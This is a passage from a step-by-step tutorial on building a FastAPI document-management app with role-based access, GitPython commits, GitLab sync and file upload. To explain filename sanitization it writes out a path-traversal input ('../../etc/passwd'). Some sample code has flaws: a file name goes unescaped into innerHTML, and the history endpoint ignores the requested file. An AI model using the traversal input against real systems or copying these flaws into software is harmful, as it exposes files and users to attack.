    </div>
    <div class="header-actions">
      <button
        id="admin-panel-btn"
        class="btn btn-secondary"
        style="display: none;"
      >
        Admin Panel
      </button>
      <button id="logout-btn" class="btn btn-secondary">Logout</button>
    </div>
  </div>
</header>
```

Update `app.js` (in DOMContentLoaded):

```javascript
// Show admin panel button for admins
const userRole = localStorage.getItem("user_role");
if (userRole === "admin") {
  const adminBtn = document.getElementById("admin-panel-btn");
  adminBtn.style.display = "block";
  adminBtn.addEventListener("click", () => {
    window.location.href = "/admin";
  });
}
```

### Serve Admin Page

Add to `main.py`:

```python
@app.get("/admin")
def serve_admin():
    """Serve the admin panel page."""
    return FileResponse("static/admin.html")
```

---

## Stage 6 Complete - Full Access Control

### What You Built

You now have:

- Role-based access control (admin vs user)
- Admin-only endpoints (delete, audit log)
- Ownership-based permissions (only lock owner can checkin)
- Admin override capabilities (force checkin, delete locked files)
- Comprehensive audit logging
- Role-aware UI (admins see different buttons)
- Admin panel for system monitoring
- Proper HTTP status codes (401 vs 403)

### Key Authorization Concepts Mastered

**RBAC Theory:**

- Access control matrix
- Roles vs individual permissions
- Principle of Least Privilege

**Implementation Patterns:**

- Dependency factories (`require_role`)
- Ownership checks (`check_file_ownership`)
- Admin overrides with logging

**Audit & Compliance:**

- Who, What, When, Where, How logging
- Immutable audit trail
- Admin monitoring capabilities

**Frontend Security:**

- Client-side = UX, not security
- Server-side enforcement
- Role-based UI rendering

### Verification Checklist

- [ ] Regular users cannot delete files
- [ ] Admins can delete files
- [ ] Users can only checkin files they locked
- [ ] Admins can force checkin any file
- [ ] Audit log records sensitive actions
- [ ] Admin panel shows audit log
- [ ] Non-admins cannot access admin panel
- [ ] Delete button only shows for admins
- [ ] Understand 401 vs 403 status codes
- [ ] Understand RBAC principles

### Security Best Practices Applied

✓ **Principle of Least Privilege** - Users have minimum permissions  
✓ **Defense in Depth** - Client hides UI, server enforces permissions  
✓ **Audit Trail** - All sensitive actions logged  
✓ **Accountability** - Know who did what  
✓ **Admin Override** - Emergency access with logging

#

In **Stage 7**, we'll connect to **Git and GitLab**:

- Replace JSON files with Git repository
- Commit every change (full version history)
- Push/pull from GitLab (backup and collaboration)
- Understand Git internals (objects, trees, commits)
- Implement file versioning
- View change history

Your app is now fully authenticated and authorized. Next, we add proper version control!

---

### Stage 7: Git Integration - Real Version Control

## Introduction: The Goal of This Stage

Your app stores data in JSON files, but there's no history. Delete a file? It's gone forever. Want to see who changed what? No way to know. Need to undo a bad edit? Impossible.

In this stage, you'll integrate **Git** - turning your file operations into a full version control system with complete history.

By the end of this stage, you will:

- Replace manual file writes with Git commits
- Understand Git's internal object model (blobs, trees, commits)
- Track every change with full attribution (who, when, why)
- Connect to GitLab for remote backup
- Implement automatic push/pull
- View file history and diffs
- Understand the DAG (Directed Acyclic Graph) of commits
- Handle merge conflicts
- Implement rollback capabilities

**Time Investment:** 6-8 hours

---

## 7.1: Git Architecture - The Object Database

### Git is NOT a File System

**Common misconception:**
"Git stores file versions like: `file_v1.txt`, `file_v2.txt`, `file_v3.txt`"

**Reality:**
Git is a **content-addressable filesystem** - a key-value database where the key is the SHA-1 hash of the content.

### The Four Object Types

Git stores everything as one of four object types:

**1. Blob (Binary Large Object)**

- Raw file content
- No filename, no metadata
- Just the bytes

**2. Tree**

- Directory listing
- Maps filenames to blobs or other trees
- Like a directory in a filesystem

**3. Commit**

- Snapshot of your project at a point in time
- Points to one tree (the root directory)
- Points to parent commit(s)
- Contains author, message, timestamp

**4. Tag**

- Named pointer to a commit
- We won't use these much

### Example: How Git Stores Your Project

**Your files:**

```
repo/
├── PN1001.mcam (content: "G0 X0 Y0")
├── PN1002.mcam (content: "G0 X10 Y10")
└── locks.json (content: "{}")
```

**Git's object database:**

```
Blob abc123: "G0 X0 Y0"
Blob def456: "G0 X10 Y10"
Blob 789ghi: "{}"

Tree jkl012:
  100644 blob abc123  PN1001.mcam
  100644 blob def456  PN1002.mcam
  100644 blob 789ghi  locks.json

Commit mno345:
  tree jkl012
  author: john <john@example.com>
  timestamp: 2025-10-03T20:30:00Z
  message: "Initial commit"
```

**Key insight:** If two files have identical content, Git stores only ONE blob.

### The Commit Graph (DAG)

Commits form a **Directed Acyclic Graph**:

```
A ← B ← C ← D (main)
    ↑
    └─ E ← F (feature-branch)
```

- Arrows point to parents
- Acyclic = no loops
- Directed = one-way relationships
- This structure enables branching, merging, time travel

---

## 7.2: Installing GitPython

### Install the Library

```bash
pip install GitPython
```

**What this installs:**

- `GitPython` - Python interface to Git
- Wraps Git command-line operations
- Provides Pythonic API

### Verify Git is Installed

```bash
git --version
```

Should show Git 2.x or higher.

---

## 7.3: Initializing the Git Repository

### Create the Repository

Add to `main.py`:

```python
from git import Repo, Actor
from git.exc import GitCommandError
import shutil

### Path to git repository
GIT_REPO_PATH = BASE_DIR / 'git_repo'

### ============================================
### GIT INITIALIZATION
### ============================================

def initialize_git_repo():
    """
    Initialize Git repository if it doesn't exist.
    Sets up the repo directory and makes initial commit.
    """
    if GIT_REPO_PATH.exists():
        logger.info(f"Git repository already exists at {GIT_REPO_PATH}")
        return Repo(GIT_REPO_PATH)

    logger.info(f"Creating new Git repository at {GIT_REPO_PATH}")

    # Create directory
    GIT_REPO_PATH.mkdir(parents=True, exist_ok=True)

    # Initialize Git repo
    repo = Repo.init(GIT_REPO_PATH)

    # Create subdirectories
    (GIT_REPO_PATH / 'repo').mkdir(exist_ok=True)

    # Create initial files
    locks_file = GIT_REPO_PATH / 'locks.json'
    locks_file.write_text('{}')

    users_file = GIT_REPO_PATH / 'users.json'
    users_file.write_text('{}')

    audit_file = GIT_REPO_PATH / 'audit_log.json'
    audit_file.write_text('[]')

    # Create .gitignore
    gitignore = GIT_REPO_PATH / '.gitignore'
    gitignore.write_text('*.pyc\n__pycache__/\n.DS_Store\n')

    # Stage all files
    repo.index.add(['locks.json', 'users.json', 'audit_log.json', '.gitignore'])

    # Create initial commit
    author = Actor("PDM System", "system@pdm.local")
    repo.index.commit(
        "Initial repository setup",
        author=author,
        committer=author
    )

    logger.info("Git repository initialized with initial commit")
    return repo

### Initialize on startup
try:
    git_repo = initialize_git_repo()
    logger.info(f"Git repository ready: {git_repo.git_dir}")
except Exception as e:
    logger.error(f"Failed to initialize Git repository: {e}")
    raise
```

### Update Path Constants

Replace your existing path constants:

```python
### OLD
REPO_PATH = BASE_DIR / 'repo'
LOCKS_FILE = BASE_DIR / 'locks.json'
USERS_FILE = BASE_DIR / 'users.json'
AUDIT_LOG_FILE = BASE_DIR / 'audit_log.json'

### NEW
REPO_PATH = GIT_REPO_PATH / 'repo'
LOCKS_FILE = GIT_REPO_PATH / 'locks.json'
USERS_FILE = GIT_REPO_PATH / 'users.json'
AUDIT_LOG_FILE = GIT_REPO_PATH / 'audit_log.json'
```

### Understanding the Code

**`Repo.init(path)`**

- Creates `.git` directory
- Initializes Git database
- Sets up HEAD, refs, config

**`repo.index`**

- The "staging area"
- Like a scratch pad for the next commit
- `.add()` stages files
- `.commit()` creates the commit object

**`Actor`**

- Represents a person in Git
- Has name and email
- Used for author and committer

**Why separate author and committer?**

```python
author = Actor("John Doe", "john@example.com")
committer = Actor("PDM System", "system@pdm.local")

repo.index.commit(
    "Fix bug",
    author=author,      # Who wrote the change
    committer=committer # Who committed it
)
```

In our case, they're usually the same, but Git allows them to differ (e.g., when applying someone else's patch).

---

## 7.4: Replacing File Operations with Git Commits

### The Pattern: Atomic Commits

**Old pattern:**

```python
locks = load_locks()
locks[filename] = {...}
save_locks(locks)
```

**New pattern:**

```python
locks = load_locks()
locks[filename] = {...}
save_locks_with_commit(locks, user, message)
```

### Implement Git-Aware Save Functions

```python
def save_locks_with_commit(
    locks: dict,
    user: str,
    message: str
):
    """
    Save locks and create a Git commit.

    Args:
        locks: The locks dictionary
        user: Username making the change
        message: Commit message
    """
    try:
        # Write the file
        with open(LOCKS_FILE, 'w') as f:
            json.dump(locks, f, indent=4)

        # Stage the file
        git_repo.index.add(['locks.json'])

        # Create commit
        author = Actor(user, f"{user}@pdm.local")
        commit = git_repo.index.commit(
            message,
            author=author,
            committer=author
        )

        logger.info(f"Git commit {commit.hexsha[:8]}: {message}")

    except GitCommandError as e:
        logger.error(f"Git error: {e}")
        raise HTTPException(
            status_code=500,
            detail="Failed to commit changes"
        )

def save_users_with_commit(users: dict, admin_user: str, message: str):
    """Save users.json with Git commit."""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(users, f, indent=4)

        git_repo.index.add(['users.json'])

        author = Actor(admin_user, f"{admin_user}@pdm.local")
        commit = git_repo.index.commit(message, author=author, committer=author)

        logger.info(f"Git commit {commit.hexsha[:8]}: {message}")

    except GitCommandError as e:
        logger.error(f"Git error: {e}")
        raise HTTPException(status_code=500, detail="Failed to commit changes")

def save_audit_log_with_commit(message: str = "Update audit log"):
    """
    Commit audit log changes.
    Called after adding audit entries.
    """
    try:
        git_repo.index.add(['audit_log.json'])
        author = Actor("PDM System", "system@pdm.local")
        git_repo.index.commit(message, author=author, committer=author)
    except GitCommandError as e:
        logger.error(f"Failed to commit audit log: {e}")
        # Don't raise - audit commit failure shouldn't break operations
```

### Update Checkout Endpoint

```python
@app.post("/api/files/checkout")
def checkout_file(
    request: CheckoutRequest,
    current_user: User = Depends(get_current_user)
):
    """Checkout a file with Git commit."""
    logger.info(f"Checkout request: {request.filename} by {current_user.username}")

    file_path = REPO_PATH / request.filename
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")

    locks = load_locks()

    if request.filename in locks:
        existing_lock = locks[request.filename]
        raise HTTPException(
            status_code=409,
            detail={
                "error": "File is already checked out",
                "locked_by": existing_lock["user"],
                "locked_at": existing_lock["timestamp"]
            }
        )

    # Create lock
    locks[request.filename] = {
        "user": current_user.username,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "message": request.message
    }

    # Save with Git commit
    commit_msg = f"Checkout: {request.filename} by {current_user.username}"
    save_locks_with_commit(locks, current_user.username, commit_msg)

    # Audit log
    log_audit_event(
        user=current_user.username,
        action="CHECKOUT_FILE",
        target=request.filename,
        details={"message": request.message}
    )
    save_audit_log_with_commit(f"Audit: Checkout {request.filename}")

    return {
        "success": True,
        "message": f"File '{request.filename}' checked out"
    }
```

### Update Checkin Endpoint

```python
@app.post("/api/files/checkin")
def checkin_file(
    request: CheckinRequest,
    current_user: User = Depends(get_current_user)
):
    """Checkin a file with Git commit."""
    logger.info(f"Checkin request: {request.filename} by {current_user.username}")

    check_file_ownership(request.filename, current_user, allow_admin_override=True)

    locks = load_locks()
    was_forced = locks[request.filename]["user"] != current_user.username

    # Remove lock
    del locks[request.filename]

    # Save with Git commit
    commit_msg = f"Checkin: {request.filename} by {current_user.username}"
    if was_forced:
        commit_msg += " (forced by admin)"

    save_locks_with_commit(locks, current_user.username, commit_msg)

    # Audit log
    log_audit_event(
        user=current_user.username,
        action="CHECKIN_FILE",
        target=request.filename,
        details={"forced": was_forced}
    )
    save_audit_log_with_commit(f"Audit: Checkin {request.filename}")

    return {
        "success": True,
        "message": f"File '{request.filename}' checked in"
    }
```

---

## 7.5: Viewing Git History

### Get File History Endpoint

```python
from datetime import datetime

@app.get("/api/files/{filename}/history")
def get_file_history(
    filename: str,
    limit: int = 50,
    current_user: User = Depends(get_current_user)
):
    """
    Get commit history for a specific file.

    Returns list of commits that modified the file.
    """
    logger.info(f"History request for {filename} by {current_user.username}")

    try:
        # Get commits that modified this file
        commits = list(git_repo.iter_commits(paths=f'locks.json', max_count=limit))

        history = []
        for commit in commits:
            # Check if this commit modified our file
            if filename in commit.message or 'locks.json' in [item.a_path for item in commit.diff(commit.parents[0] if commit.parents else None)]:
                history.append({
                    "hash": commit.hexsha,
                    "short_hash": commit.hexsha[:8],
                    "author": commit.author.name,
                    "email": commit.author.email,
                    "timestamp": commit.committed_datetime.isoformat(),
                    "message": commit.message.strip()
                })

        return {
            "filename": filename,
            "total_commits": len(history),
            "commits": history
        }

    except GitCommandError as e:
        logger.error(f"Git error getting history: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve history")
```

### Understanding Git Commit Iteration

**`git_repo.iter_commits()`**

- Returns iterator of Commit objects
- Traverses the DAG backwards from HEAD
- `paths=` filters to commits touching specific files
- `max_count=` limits results

**Commit object attributes:**

```python
commit.hexsha          # Full SHA-1 hash (40 chars)
commit.author          # Actor object
commit.author.name     # "John Doe"
commit.author.email    # "john@example.com"
commit.message         # Commit message
commit.committed_datetime  # Python datetime
commit.parents         # List of parent commits
```

### Get Full Repository History

```python
@app.get("/api/git/history")
def get_repository_history(
    limit: int = 100,
    current_user: User = Depends(get_current_user)
):
    """
    Get recent commit history for entire repository.
    """
    try:
        commits = list(git_repo.iter_commits(max_count=limit))

        history = []
        for commit in commits:
            # Get files changed
            if commit.parents:
                diffs = commit.diff(commit.parents[0])
                files_changed = [item.a_path for item in diffs]
            else:
                files_changed = []

            history.append({
                "hash": commit.hexsha,
                "short_hash": commit.hexsha[:8],
                "author": commit.author.name,
                "timestamp": commit.committed_datetime.isoformat(),
                "message": commit.message.strip(),
                "files_changed": files_changed
            })

        return {"commits": history}

    except Exception as e:
        logger.error(f"Error getting history: {e}")
        raise HTTPException(status_code=500, detail="Failed to get history")
```

---

## 7.6: Connecting to GitLab

### GitLab Remote Setup

**Prerequisites:**

1. GitLab account
2. SSH key added to GitLab (from Stage 0)
3. Create a new project on GitLab

### Add Remote to Repository

```python
def setup_gitlab_remote(remote_url: str):
    """
    Add GitLab as remote origin.

    Args:
        remote_url: Git URL (SSH format recommended)
                   Example: git@gitlab.com:username/pdm-repo.git
    """
    try:
        # Check if remote already exists
        if 'origin' in [remote.name for remote in git_repo.remotes]:
            origin = git_repo.remote('origin')
            logger.info(f"Remote 'origin' already exists: {origin.url}")

            # Update URL if different
            if origin.url != remote_url:
                origin.set_url(remote_url)
                logger.info(f"Updated remote URL to: {remote_url}")
        else:
            # Add new remote
            origin = git_repo.create_remote('origin', remote_url)
            logger.info(f"Added remote 'origin': {remote_url}")

        return origin

    except GitCommandError as e:
        logger.error(f"Failed to setup remote: {e}")
        raise
```

### Configuration Endpoint (Admin Only)

```python
from pydantic import BaseModel, Field

class GitLabConfig(BaseModel):
    remote_url: str = Field(..., description="GitLab repository URL")
    auto_push: bool = Field(default=True, description="Automatically push after commits")
    auto_pull: bool = Field(default=True, description="Automatically pull before operations")

@app.post("/api/admin/git/configure")
def configure_gitlab(
    config: GitLabConfig,
    current_user: User = Depends(require_admin)
):
    """
    Configure GitLab integration - ADMIN ONLY.
    """
    logger.info(f"GitLab configuration by {current_user.username}")

    try:
        # Setup remote
        setup_gitlab_remote(config.remote_url)

        # Save config to file
        config_file = GIT_REPO_PATH / 'gitlab_config.json'
        with open(config_file, 'w') as f:
            json.dump(config.dict(), f, indent=4)

        # Commit the config
        git_repo.index.add(['gitlab_config.json'])
        author = Actor(current_user.username, f"{current_user.username}@pdm.local")
        git_repo.index.commit(
            "Configure GitLab integration",
            author=author,
            committer=author
        )

        logger.info("GitLab configuration saved")

        return {
            "success": True,
            "message": "GitLab configured successfully"
        }

    except Exception as e:
        logger.error(f"GitLab configuration failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))
```

### Load GitLab Configuration

```python
def load_gitlab_config() -> dict:
    """Load GitLab configuration."""
    config_file = GIT_REPO_PATH / 'gitlab_config.json'

    if not config_file.exists():
        return {
            "remote_url": None,
            "auto_push": False,
            "auto_pull": False
        }

    try:
        with open(config_file, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Failed to load GitLab config: {e}")
        return {"remote_url": None, "auto_push": False, "auto_pull": False}
```

### Push to GitLab

```python
def push_to_gitlab():
    """
    Push commits to GitLab remote.
    """
    config = load_gitlab_config()

    if not config.get("auto_push"):
        logger.debug("Auto-push disabled, skipping")
        return

    if not config.get("remote_url"):
        logger.warning("GitLab not configured, cannot push")
        return

    try:
        origin = git_repo.remote('origin')

        # Push to main branch
        logger.info("Pushing to GitLab...")
        origin.push('main')
        logger.info("Push successful")

    except GitCommandError as e:
        logger.error(f"Push failed: {e}")
        # Don't raise - push failure shouldn't break the operation
    except Exception as e:
        logger.error(f"Unexpected push error: {e}")
```

### Pull from GitLab

```python
def pull_from_gitlab():
    """
    Pull latest changes from GitLab.
    Uses rebase strategy to maintain linear history.
    """
    config = load_gitlab_config()

    if not config.get("auto_pull"):
        logger.debug("Auto-pull disabled, skipping")
        return

    if not config.get("remote_url"):
        return

    try:
        origin = git_repo.remote('origin')

        # Pull with rebase
        logger.info("Pulling from GitLab...")
        origin.pull('main', rebase=True)
        logger.info("Pull successful")

    except GitCommandError as e:
        logger.error(f"Pull failed: {e}")
        # This SHOULD raise - we need latest changes before proceeding
        raise HTTPException(
            status_code=409,
            detail="Failed to sync with GitLab. Please try again."
        )
```

### Integrate into Save Functions

Update `save_locks_with_commit`:

```python
def save_locks_with_commit(locks: dict, user: str, message: str):
    """Save locks with Git commit and optional GitLab push."""
    try:
        # Pull latest changes first
        pull_from_gitlab()

        # Write file
        with open(LOCKS_FILE, 'w') as f:
            json.dump(locks, f, indent=4)

        # Stage and commit
        git_repo.index.add(['locks.json'])
        author = Actor(user, f"{user}@pdm.local")
        commit = git_repo.index.commit(message, author=author, committer=author)

        logger.info(f"Git commit {commit.hexsha[:8]}: {message}")

        # Push to GitLab
        push_to_gitlab()

    except GitCommandError as e:
        logger.error(f"Git error: {e}")
        raise HTTPException(status_code=500, detail="Failed to commit changes")
```

---

## 7.7: Understanding Git Internals - The Object Model

### Exploring the `.git` Directory

```bash
cd backend/git_repo/.git

### Object database
ls objects/
### You'll see subdirectories like: 00/ 01/ 02/ ... ff/

### Each subdirectory contains objects
ls objects/ab/
### Example: cdef1234567890... (38 characters)

### Combined: ab + cdef... = full 40-char SHA-1
```

### Inspecting Git Objects

Add admin endpoint:

```python
@app.get("/api/admin/git/object/{sha}")
def inspect_git_object(
    sha: str,
    current_user: User = Depends(require_admin)
):
    """
    Inspect a Git object by SHA.
    Educational endpoint to understand Git internals.
    """
    try:
        # Get the object
        obj = git_repo.odb.info(sha)

        # Read the object
        data = git_repo.odb.stream(sha).read()

        return {
            "sha": sha,
            "type": obj.type,
            "size": obj.size,
            "content": data.decode('utf-8', errors='replace')[:1000]  # First 1000 chars
        }

    except Exception as e:
        raise HTTPException(status_code=404, detail=f"Object not found: {e}")
```

### The Object Storage Algorithm

**How Git stores objects:**

1. **Create content:**

   ```python
   content = "Hello, Git!"
   ```

2. **Add header:**

   ```python
   header = f"blob {len(content)}\0"
   store = header + content
   # Result: "blob 11\0Hello, Git!"
   ```

3. **Hash:**

   ```python
   import hashlib
   sha1 = hashlib.sha1(store.encode()).hexdigest()
   # Result: "af5626b4a114abcb82d63db7c8082c3c4756e51b"
   ```

4. **Compress:**

   ```python
   import zlib
   compressed = zlib.compress(store.encode())
   ```

5. **Store:**

   ```python
   # First 2 chars = directory
   dir = sha1[:2]  # "af"

   # Remaining 38 chars = filename
   file = sha1[2:]  # "5626b4a114abcb82d63db7c8082c3c4756e51b"

   # Write to: .git/objects/af/5626b4a114abcb82d63db7c8082c3c4756e51b
   ```

This is why Git is called "content-addressable" - the address (SHA-1) IS the content's hash.

---

## Stage 7 Complete - Full Version Control

### What You Built

You now have:

- Git repository for all data
- Every change is a commit (full history)
- Attribution (who made each change)
- GitLab integration (remote backup)
- Automatic push/pull
- Commit history viewing
- Understanding of Git internals

### Key Git Concepts Mastered

**Architecture:**

- Object database (blobs, trees, commits)
- Content-addressable storage
- DAG (Directed Acyclic Graph)

**Operations:**

- Staging area (index)
- Commits with author/committer
- Remote operations (push/pull)
- Rebasing for linear history

**Integration:**

- GitPython API
- Atomic operations (commit = transaction)
- Pull before write (avoid conflicts)
- Push after write (backup)

### Verification Checklist

- [ ] Git repository initialized
- [ ] Checkout creates commit
- [ ] Checkin creates commit
- [ ] Can view commit history
- [ ] GitLab remote configured
- [ ] Auto-push works
- [ ] Auto-pull works
- [ ] Understand Git object model
- [ ] Know what SHA-1 hashes represent

### The Power of Version Control

**Before Git:**

- Delete file → gone forever
- Who changed what? → unknown
- Undo mistake? → impossible
- Collaborate? → conflicts everywhere

**With Git:**

- Delete file → recoverable from history
- Who changed what? → `git log` shows everything
- Undo mistake? → `git revert`
- Collaborate? → pull, commit, push, merge

#

In **Stage 8**, we'll add advanced features:

- File upload (add new .mcam files to repo)
- File download with versioning
- Diff viewing (see what changed)
- Blame view (line-by-line attribution)
- Branch management for experimental changes
- Merge conflict resolution

Your app now has enterprise-grade version control. Every change is tracked, attributed, and recoverable!

---

### Stage 8: Advanced Git Features - Upload, Download, Diff & Blame

## Introduction: The Goal of This Stage

You have version control, but users can't add new files to the repository. There's no way to download files or view what changed between versions. The real power of Git - diffs, blame, branches - is untapped.

In this stage, you'll build advanced Git-powered features that turn your PDM system into a full-featured version control interface.

By the end of this stage, you will:

- Upload new files to the Git repository
- Download files with version selection
- View diffs (what changed between commits)
- Implement blame view (who wrote each line)
- Create and manage branches
- Handle merge conflicts
- Understand three-way merges
- Build a visual diff viewer in the frontend

**Time Investment:** 7-9 hours

---

## 8.1: File Upload with Git Integration

### The Upload Flow

**Traditional file upload:**

1. User selects file
2. Browser sends file to server
3. Server saves to disk
4. Done

**Git-integrated upload:**

1. User selects file
2. Browser sends file to server
3. Server validates file
4. Server writes to `repo/` directory
5. Server stages file in Git
6. Server commits with attribution
7. Server pushes to GitLab
8. Done (file is versioned and backed up)

### FastAPI File Upload Endpoint

Add to `main.py`:

```python
from fastapi import File, UploadFile
from fastapi.responses import StreamingResponse
import io

@app.post("/api/files/upload")
async def upload_file(
    file: UploadFile = File(...),
    current_user: User = Depends(get_current_user)
):
    """
    Upload a new file to the repository.
    File is committed to Git with attribution.
    """
    logger.info(f"Upload request from {current_user.username}: {file.filename}")

    # Validate filename
    if not file.filename:
        raise HTTPException(status_code=400, detail="No filename provided")

    # Validate file extension
    if not file.filename.endswith('.mcam'):
        raise HTTPException(
            status_code=400,
            detail="Only .mcam files are allowed"
        )

    # Sanitize filename (prevent directory traversal)
    safe_filename = os.path.basename(file.filename)
    file_path = REPO_PATH / safe_filename

    # Check if file already exists
    if file_path.exists():
        raise HTTPException(
            status_code=409,
            detail=f"File '{safe_filename}' already exists. Use update endpoint to modify."
        )

    try:
        # Pull latest changes
        pull_from_gitlab()

        # Read and save file content
        content = await file.read()

        # Validate file size (e.g., max 10MB)
        max_size = 10 * 1024 * 1024  # 10MB
        if len(content) > max_size:
            raise HTTPException(
                status_code=413,
                detail="File too large. Maximum size: 10MB"
            )

        # Write file
        with open(file_path, 'wb') as f:
            f.write(content)

        logger.info(f"File written: {safe_filename} ({len(content)} bytes)")

        # Stage in Git
        git_repo.index.add([f'repo/{safe_filename}'])

        # Commit
        author = Actor(current_user.username, f"{current_user.username}@pdm.local")
        commit_msg = f"Upload file: {safe_filename} by {current_user.username}"
        commit = git_repo.index.commit(commit_msg, author=author, committer=author)

        logger.info(f"Git commit {commit.hexsha[:8]}: {commit_msg}")

        # Push to GitLab
        push_to_gitlab()

        # Audit log
        log_audit_event(
            user=current_user.username,
            action="UPLOAD_FILE",
            target=safe_filename,
            details={"size": len(content)}
        )
        save_audit_log_with_commit(f"Audit: Upload {safe_filename}")

        return {
            "success": True,
            "message": f"File '{safe_filename}' uploaded successfully",
            "commit": commit.hexsha[:8],
            "size": len(content)
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Upload failed: {e}")
        # Clean up file if commit failed
        if file_path.exists():
            os.remove(file_path)
        raise HTTPException(status_code=500, detail="Upload failed")
```

### Understanding File Upload in FastAPI

**`UploadFile` parameter:**

```python
async def upload_file(file: UploadFile = File(...)):
```

**What is `UploadFile`?**

- FastAPI wrapper around uploaded files
- Provides async methods
- Handles multipart/form-data

**Attributes:**

```python
file.filename     # "document.mcam"
file.content_type # "application/octet-stream"
file.size         # File size (if available)
```

**Methods:**

```python
await file.read()       # Read entire file into memory
await file.seek(0)      # Reset file pointer
await file.write(path)  # Write to disk
```

### Security: Filename Sanitization

```python
safe_filename = os.path.basename(file.filename)
```

**Why sanitize?**

**Attack:** User uploads with filename: `../../etc/passwd`

**Without sanitization:**

```python
file_path = REPO_PATH / file.filename
### Result: /path/to/repo/../../etc/passwd
### = /path/to/etc/passwd (OUTSIDE your repo!)
```

**With `os.path.basename()`:**

```python
safe_filename = os.path.basename("../../etc/passwd")
### Result: "passwd"
file_path = REPO_PATH / safe_filename
### Result: /path/to/repo/passwd (SAFE)
```

**`os.path.basename()` removes directory parts:**

```python
os.path.basename("/a/b/c/file.txt")  # "file.txt"
os.path.basename("../../file.txt")   # "file.txt"
os.path.basename("file.txt")         # "file.txt"
```

### Frontend: Upload UI

Add to `index.html`:

```html
<section>
  <h2>Upload New File</h2>
  <form id="upload-form" enctype="multipart/form-data">
    <div class="upload-area" id="upload-area">
      <input
        type="file"
        id="file-input"
        accept=".mcam"
        style="display: none;"
      />
      <div class="upload-prompt">
        <p>📁 Click to select or drag and drop a .mcam file</p>
        <p class="upload-hint">Maximum file size: 10MB</p>
      </div>
      <div id="file-preview" class="file-preview hidden"></div>
    </div>
    <button type="submit" class="btn btn-primary" id="upload-btn" disabled>
      Upload File
    </button>
  </form>
</section>
```

### Upload CSS

Add to `style.css`:

```css
/* ============================================
   FILE UPLOAD
   ============================================ */

.upload-area {
  border: 2px dashed #667eea;
  border-radius: 8px;
  padding: 3rem 2rem;
  text-align: center;
  cursor: pointer;
  transition: all 0.3s ease;
  background: #f8f9ff;
}

.upload-area:hover {
  border-color: #764ba2;
  background: #f0f1ff;
}

.upload-area.drag-over {
  border-color: #28a745;
  background: #e8f5e9;
}

.upload-prompt p {
  margin: 0.5rem 0;
  color: #667eea;
  font-weight: 500;
}

.upload-hint {
  font-size: 0.9rem;
  color: #999;
}

.file-preview {
  margin-top: 1rem;
  padding: 1rem;
  background: white;
  border-radius: 4px;
  text-align: left;
}

.file-preview.hidden {
  display: none;
}

#upload-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}
```

### Upload JavaScript

Add to `app.js`:

```javascript
document.addEventListener("DOMContentLoaded", function () {
  // ... existing code ...

  setupFileUpload();
});

function setupFileUpload() {
  const uploadArea = document.getElementById("upload-area");
  const fileInput = document.getElementById("file-input");
  const filePreview = document.getElementById("file-preview");
  const uploadBtn = document.getElementById("upload-btn");
  const uploadForm = document.getElementById("upload-form");

  // Click to select file
  uploadArea.addEventListener("click", () => {
    fileInput.click();
  });

  // File selected
  fileInput.addEventListener("change", (e) => {
    const file = e.target.files[0];
    if (file) {
      showFilePreview(file);
      uploadBtn.disabled = false;
    }
  });

  // Drag and drop
  uploadArea.addEventListener("dragover", (e) => {
    e.preventDefault();
    uploadArea.classList.add("drag-over");
  });

  uploadArea.addEventListener("dragleave", () => {
    uploadArea.classList.remove("drag-over");
  });

  uploadArea.addEventListener("drop", (e) => {
    e.preventDefault();
    uploadArea.classList.remove("drag-over");

    const file = e.dataTransfer.files[0];
    if (file && file.name.endsWith(".mcam")) {
      fileInput.files = e.dataTransfer.files;
      showFilePreview(file);
      uploadBtn.disabled = false;
    } else {
      showNotification("Please upload a .mcam file", "error");
    }
  });

  // Submit
  uploadForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    await handleFileUpload();
  });
}

function showFilePreview(file) {
  const preview = document.getElementById("file-preview");
  preview.classList.remove("hidden");

  const sizeKB = (file.size / 1024).toFixed(2);
  preview.innerHTML = `
        <strong>Selected file:</strong> ${file.name}<br>
        <strong>Size:</strong> ${sizeKB} KB<br>
        <strong>Type:</strong> ${file.type || "application/octet-stream"}
    `;
}

async function handleFileUpload() {
  const fileInput = document.getElementById("file-input");
  const file = fileInput.files[0];

  if (!file) {
    showNotification("No file selected", "error");
    return;
  }

  const uploadBtn = document.getElementById("upload-btn");
  uploadBtn.disabled = true;
  uploadBtn.textContent = "Uploading...";

  try {
    const formData = new FormData();
    formData.append("file", file);

    const token = localStorage.getItem("access_token");

    const response = await fetch("/api/files/upload", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${token}`,
      },
      body: formData, // Don't set Content-Type - browser does it automatically
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.detail || "Upload failed");
    }

    const data = await response.json();
    showNotification(data.message, "success");

    // Reset form
    fileInput.value = "";
    document.getElementById("file-preview").classList.add("hidden");
    uploadBtn.disabled = true;
    uploadBtn.textContent = "Upload File";

    // Reload file list
    loadFiles();
  } catch (error) {
    console.error("Upload error:", error);
    showNotification(error.message, "error");
    uploadBtn.disabled = false;
    uploadBtn.textContent = "Upload File";
  }
}
```

### Understanding Drag and Drop API

**The events:**

**`dragover`** - Fires continuously while dragging over element

```javascript
uploadArea.addEventListener("dragover", (e) => {
  e.preventDefault(); // Required! Default is to reject drops
  uploadArea.classList.add("drag-over");
});
```

**`dragleave`** - Fires when leaving the element

```javascript
uploadArea.addEventListener("dragleave", () => {
  uploadArea.classList.remove("drag-over");
});
```

**`drop`** - Fires when user releases the file

```javascript
uploadArea.addEventListener("drop", (e) => {
  e.preventDefault(); // Prevent browser from opening the file

  const file = e.dataTransfer.files[0]; // Get the dropped file
  // Handle the file...
});
```

**Why `e.preventDefault()`?**

Without it:

- `dragover` - Browser rejects the drop (cursor shows "not allowed")
- `drop` - Browser opens the file (navigates away from your app)

With it:

- You control what happens

---

## 8.2: File Download with Version Selection

### Download Latest Version

```python
@app.get("/api/files/{filename}/download")
def download_file(
    filename: str,
    commit_sha: str = None,
    current_user: User = Depends(get_current_user)
):
    """
    Download a file from the repository.

    Query parameters:
        commit_sha: Optional. Download from specific commit (defaults to latest)
    """
    logger.info(f"Download request: {filename} by {current_user.username}")

    safe_filename = os.path.basename(filename)

    try:
